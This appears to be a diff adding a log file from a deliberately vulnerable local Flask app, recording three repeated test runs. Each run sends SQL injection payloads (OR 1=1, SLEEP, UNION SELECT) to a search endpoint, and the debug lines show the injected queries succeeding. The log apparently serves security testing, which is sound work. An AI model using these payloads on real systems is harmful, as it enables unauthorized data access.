@@ -1,0 +1,87 @@
+2025-11-12 18:19:35,116 - __main__ - INFO - Starting vulnerable Flask application on port 5000
+2025-11-12 18:19:35,305 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2025-11-12 18:19:35,305 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-11-12 18:19:35,598 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "GET /health HTTP/1.1" 200 -
+2025-11-12 18:19:35,626 - __main__ - INFO - Search request with query parameter: john
+2025-11-12 18:19:35,628 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%john%'
+2025-11-12 18:19:35,630 - __main__ - INFO - Search returned 2 results
+2025-11-12 18:19:35,633 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "GET /search?query=john HTTP/1.1" 200 -
+2025-11-12 18:19:35,658 - __main__ - INFO - Search request with query parameter: ' OR '1'='1
+2025-11-12 18:19:35,660 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' OR '1'='1%'
+2025-11-12 18:19:35,663 - __main__ - INFO - Search returned 5 results
+2025-11-12 18:19:35,663 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "GET /search?query='+OR+'1'%3D'1 HTTP/1.1" 200 -
+2025-11-12 18:19:35,689 - __main__ - INFO - Search request with query parameter: %27%20OR%20%271%27%3D%271
+2025-11-12 18:19:35,690 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%%27%20OR%20%271%27%3D%271%'
+2025-11-12 18:19:35,692 - __main__ - INFO - Search returned 0 results
+2025-11-12 18:19:35,693 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "GET /search?query=%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1" 200 -
+2025-11-12 18:19:35,711 - __main__ - INFO - Search request with query parameter: test' AND SLEEP(3)--
+2025-11-12 18:19:35,715 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%test' AND SLEEP(3)--%'
+2025-11-12 18:19:35,717 - __main__ - ERROR - Error in search: no such function: SLEEP
+2025-11-12 18:19:35,718 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "[35m[1mGET /search?query=test'+AND+SLEEP(3)-- HTTP/1.1[0m" 500 -
+2025-11-12 18:19:35,723 - __main__ - INFO - Search request with query parameter: ' UNION SELECT * FROM information_schema.tables--
+2025-11-12 18:19:35,726 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT * FROM information_schema.tables--%'
+2025-11-12 18:19:35,727 - __main__ - ERROR - Error in search: no such table: information_schema.tables
+2025-11-12 18:19:35,729 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "[35m[1mGET /search?query='+UNION+SELECT+*+FROM+information_schema.tables-- HTTP/1.1[0m" 500 -
+2025-11-12 18:19:35,748 - __main__ - INFO - Search request with query parameter: ' UNION SELECT 1,2,3,4--
+2025-11-12 18:19:35,749 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT 1,2,3,4--%'
+2025-11-12 18:19:35,750 - __main__ - INFO - Search returned 6 results
+2025-11-12 18:19:35,751 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:19:35] "GET /search?query='+UNION+SELECT+1,2,3,4-- HTTP/1.1" 200 -
+2025-11-12 18:20:12,665 - __main__ - INFO - Starting vulnerable Flask application on port 5000
+2025-11-12 18:20:12,696 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2025-11-12 18:20:12,697 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-11-12 18:20:14,877 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "GET /health HTTP/1.1" 200 -
+2025-11-12 18:20:14,885 - __main__ - INFO - Search request with query parameter: john
+2025-11-12 18:20:14,888 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%john%'
+2025-11-12 18:20:14,889 - __main__ - INFO - Search returned 2 results
+2025-11-12 18:20:14,890 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "GET /search?query=john HTTP/1.1" 200 -
+2025-11-12 18:20:14,895 - __main__ - INFO - Search request with query parameter: ' OR '1'='1
+2025-11-12 18:20:14,899 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' OR '1'='1%'
+2025-11-12 18:20:14,899 - __main__ - INFO - Search returned 5 results
+2025-11-12 18:20:14,901 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "GET /search?query='+OR+'1'%3D'1 HTTP/1.1" 200 -
+2025-11-12 18:20:14,911 - __main__ - INFO - Search request with query parameter: %27%20OR%20%271%27%3D%271
+2025-11-12 18:20:14,912 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%%27%20OR%20%271%27%3D%271%'
+2025-11-12 18:20:14,912 - __main__ - INFO - Search returned 0 results
+2025-11-12 18:20:14,914 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "GET /search?query=%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1" 200 -
+2025-11-12 18:20:14,922 - __main__ - INFO - Search request with query parameter: test' AND SLEEP(3)--
+2025-11-12 18:20:14,924 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%test' AND SLEEP(3)--%'
+2025-11-12 18:20:14,925 - __main__ - ERROR - Error in search: no such function: SLEEP
+2025-11-12 18:20:14,925 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "[35m[1mGET /search?query=test'+AND+SLEEP(3)-- HTTP/1.1[0m" 500 -
+2025-11-12 18:20:14,944 - __main__ - INFO - Search request with query parameter: ' UNION SELECT * FROM information_schema.tables--
+2025-11-12 18:20:14,945 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT * FROM information_schema.tables--%'
+2025-11-12 18:20:14,946 - __main__ - ERROR - Error in search: no such table: information_schema.tables
+2025-11-12 18:20:14,947 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "[35m[1mGET /search?query='+UNION+SELECT+*+FROM+information_schema.tables-- HTTP/1.1[0m" 500 -
+2025-11-12 18:20:14,954 - __main__ - INFO - Search request with query parameter: ' UNION SELECT 1,2,3,4--
+2025-11-12 18:20:14,956 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT 1,2,3,4--%'
+2025-11-12 18:20:14,957 - __main__ - INFO - Search returned 6 results
+2025-11-12 18:20:14,958 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:20:14] "GET /search?query='+UNION+SELECT+1,2,3,4-- HTTP/1.1" 200 -
+2025-11-12 18:29:31,155 - __main__ - INFO - Starting vulnerable Flask application on port 5000
+2025-11-12 18:29:31,186 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on http://127.0.0.1:5000
+2025-11-12 18:29:31,186 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
+2025-11-12 18:29:33,296 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "GET /health HTTP/1.1" 200 -
+2025-11-12 18:29:33,306 - __main__ - INFO - Search request with query parameter: john
+2025-11-12 18:29:33,308 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%john%'
+2025-11-12 18:29:33,311 - __main__ - INFO - Search returned 2 results
+2025-11-12 18:29:33,312 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "GET /search?query=john HTTP/1.1" 200 -
+2025-11-12 18:29:33,321 - __main__ - INFO - Search request with query parameter: ' OR '1'='1
+2025-11-12 18:29:33,323 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' OR '1'='1%'
+2025-11-12 18:29:33,323 - __main__ - INFO - Search returned 5 results
+2025-11-12 18:29:33,324 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "GET /search?query='+OR+'1'%3D'1 HTTP/1.1" 200 -
+2025-11-12 18:29:33,331 - __main__ - INFO - Search request with query parameter: %27%20OR%20%271%27%3D%271
+2025-11-12 18:29:33,331 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%%27%20OR%20%271%27%3D%271%'
+2025-11-12 18:29:33,331 - __main__ - INFO - Search returned 0 results
+2025-11-12 18:29:33,337 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "GET /search?query=%2527%2520OR%2520%25271%2527%253D%25271 HTTP/1.1" 200 -
+2025-11-12 18:29:33,343 - __main__ - INFO - Search request with query parameter: test' AND SLEEP(3)--
+2025-11-12 18:29:33,344 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%test' AND SLEEP(3)--%'
+2025-11-12 18:29:33,345 - __main__ - ERROR - Error in search: no such function: SLEEP
+2025-11-12 18:29:33,345 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "[35m[1mGET /search?query=test'+AND+SLEEP(3)-- HTTP/1.1[0m" 500 -
+2025-11-12 18:29:33,355 - __main__ - INFO - Search request with query parameter: ' UNION SELECT * FROM information_schema.tables--
+2025-11-12 18:29:33,356 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT * FROM information_schema.tables--%'
+2025-11-12 18:29:33,357 - __main__ - ERROR - Error in search: no such table: information_schema.tables
+2025-11-12 18:29:33,357 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "[35m[1mGET /search?query='+UNION+SELECT+*+FROM+information_schema.tables-- HTTP/1.1[0m" 500 -
+2025-11-12 18:29:33,360 - __main__ - INFO - Search request with query parameter: ' UNION SELECT 1,2,3,4--
+2025-11-12 18:29:33,364 - __main__ - DEBUG - Executing SQL: SELECT id, name, email, role FROM users WHERE name LIKE '%' UNION SELECT 1,2,3,4--%'
+2025-11-12 18:29:33,364 - __main__ - INFO - Search returned 6 results
+2025-11-12 18:29:33,364 - werkzeug - INFO - 127.0.0.1 - - [12/Nov/2025 18:29:33] "GET /search?query='+UNION+SELECT+1,2,3,4-- HTTP/1.1" 200 -
